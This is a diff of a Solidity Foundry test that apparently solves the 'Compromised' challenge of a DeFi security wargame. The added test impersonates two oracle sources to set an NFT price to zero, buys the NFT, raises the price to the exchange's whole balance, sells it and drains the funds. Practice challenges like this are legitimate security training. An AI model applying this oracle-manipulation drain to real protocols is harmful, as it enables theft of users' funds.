@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {OracleExploit} from "./OracleExploit.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -74,8 +75,22 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    function setPrice(uint256 price) public{
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], price);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], price);
+        vm.stopPrank();
+    }
     function test_compromised() public checkSolved {
-        
+        OracleExploit exploit = new OracleExploit(oracle, exchange, nft, recovery);
+        setPrice(0);
+        assert(oracle.getMedianPrice(nft.symbol()) == 0);
+        exploit.buyNFT{value: PLAYER_INITIAL_ETH_BALANCE}();
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sellNFT();
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
